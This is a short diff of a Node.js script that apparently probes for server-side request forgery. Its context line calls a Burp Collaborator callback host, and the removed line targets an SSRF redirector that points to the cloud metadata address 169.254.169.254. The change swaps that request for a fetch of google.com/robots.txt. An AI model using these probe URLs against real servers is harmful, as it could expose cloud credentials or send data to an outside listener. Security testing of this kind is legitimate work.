@@ -49,7 +49,7 @@ request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=St
 */
 var request = require('request');
 followAllRedirects: true,
-request('https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml', function (error, response, body) {
+request('https://google.com/robots.txt', function (error, response, body) {
   if (1 == 1) {
     console.log(response.statusCode);
     console.log(response.body);    // Prints the JSON object
